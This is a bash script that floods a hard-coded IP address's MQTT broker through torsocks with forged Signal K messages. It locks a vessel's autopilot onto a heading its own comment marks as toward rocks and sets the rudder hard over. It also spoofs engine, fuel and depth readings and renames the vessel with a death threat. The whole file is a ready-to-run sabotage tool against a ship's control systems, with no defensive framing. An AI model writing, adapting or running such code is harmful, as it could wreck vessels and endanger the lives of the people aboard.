#!/bin/bash
# SIGNALK_FLOOD_V3.sh - PRIORITY TAKEOVER + NO SENSOR OVERRIDE
TARGET="92.251.46.201"
PORT="1883"

kill_flood() {
    pkill -f "mosquitto_pub.*$TARGET"
}

trap kill_flood INT

echo "[*] MQTT FLOOD PRIORITY TAKEOVER - OVERRIDE SENSORS"
echo "[*] Ctrl+C per fermare"

# 🔄 FLOOD CONTINUO QoS=2 (ACK garantito) - 10 msg/sec
while true; do
    # AUTOPILOTA LOCKED + COLLISION 170°
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "vessels/self/steering/autopilot/engaged" -m "true" -q 2 &
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "vessels/self/steering/autopilot/state" -m "enabled" -q 2 &
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "vessels/self/steering/autopilot/mode" -m "heading" -q 2 &
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "vessels/self/steering/autopilot/target" -m "2.9670597283903604" -q 2 &  # 170° ROCCHE
    
    # RUDDER FULL RIGHT
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "vessels/self/steering/rudderAngle" -m "1.5707963267948966" -q 2 &  # +90°
    
    # RPM + TEMP MAX
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "vessels/self/propulsion/0/revolutions/value" -m "4500" -q 2 &
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "vessels/self/propulsion/0/temperature/value" -m "600" -q 2 &
    
    # FUEL 0% + DEPTH 0
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "vessels/self/tanks/fuel/1/currentVolume" -m "0" -q 2 &
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "vessels/self/tanks/fuel/2/currentVolume" -m "0" -q 2 &
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "vessels/self/environment/depth/belowTransducer" -m "0.01" -q 2 &
    
    # DEFACE + LOCK
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "vessels/self/name" -m "TRUSTEDF57_KILL_YOU" -q 2 &
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "vessels/self/steering/autopilot/locked" -m "true" -q 2 &
    
    sleep 0.1  # 10 msg/sec
done
